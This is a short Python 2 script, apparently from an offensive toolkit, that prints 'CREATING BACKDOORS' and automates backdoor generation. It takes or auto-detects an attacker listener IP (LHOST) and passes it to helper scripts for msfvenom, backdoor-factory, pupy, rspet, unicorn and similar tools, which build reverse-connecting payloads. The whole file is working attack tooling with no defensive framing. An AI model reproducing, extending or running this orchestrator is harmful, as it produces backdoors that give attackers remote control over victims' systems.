# -*- coding: utf-8 -*-
import sys
from subprocess import call
from config_paths import *

def execute_comand(cmd):
    try:
        print cmd
        call(cmd, shell=True)
    except:
        print "UNCOMPLETE: "+cmd

###############
## MAIN PART ##
###############
print "CREATING BACKDOORS"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

os.chdir(KAOSK_path)
execute_comand("python msfvenomAuto.py "+ LHOST)
execute_comand("python backdoor-factoryAuto.py "+ LHOST)
execute_comand("python miaomiaoAuto.py")
execute_comand("python pupyAuto.py "+ LHOST)
execute_comand("python rspetAuto.py "+ LHOST)
execute_comand("python unicornAuto.py "+ LHOST)
execute_comand("python cp_index.py")
